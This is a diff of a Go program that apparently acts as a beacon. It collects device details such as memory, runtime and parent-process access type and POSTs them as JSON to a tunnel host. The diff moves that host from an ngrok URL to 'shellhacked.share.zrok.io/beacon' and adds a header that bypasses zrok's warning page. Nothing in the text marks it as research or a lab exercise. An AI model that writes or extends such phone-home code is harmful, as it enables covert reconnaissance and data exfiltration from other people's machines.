@@ -8,6 +8,7 @@ import (
 	"os"
 	"runtime"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/shirou/gopsutil/v3/mem"
@@ -94,13 +95,43 @@ func getTotalMemory() uint64 {
 	return v.Total
 }
 
+var (
+	sendOnce     sync.Once
+	sendComplete bool
+	sendErr      error
+)
+
 func sendDeviceInfo(info DeviceInfo) error {
+	sendOnce.Do(func() {
+		sendErr = performSend(info)
+		sendComplete = true
+	})
+
+	return sendErr
+}
+
+func performSend(info DeviceInfo) error {
 	jsonData, err := json.Marshal(info)
 	if err != nil {
 		return err
 	}
 
-	resp, err := http.Post("https://33cc-89-187-175-144.ngrok-free.app/beacon", "application/json", bytes.NewBuffer(jsonData))
+	client := &http.Client{}
+
+	// Create a new request
+	req, err := http.NewRequest("POST", "https://shellhacked.share.zrok.io/beacon", bytes.NewBuffer(jsonData))
+	if err != nil {
+		return err
+	}
+
+	// Set the content type header
+	req.Header.Set("Content-Type", "application/json")
+
+	// Add the X-Skip-Zrok-Interstitial header
+	req.Header.Set("skip_zrok_interstitial", "true")
+
+	// Send the request
+	resp, err := client.Do(req)
 	if err != nil {
 		return err
 	}
@@ -108,7 +139,6 @@ func sendDeviceInfo(info DeviceInfo) error {
 
 	return nil
 }
-
 func determineAccessType() string {
 	proc, err := process.NewProcess(int32(os.Getppid()))
 	if err == nil {
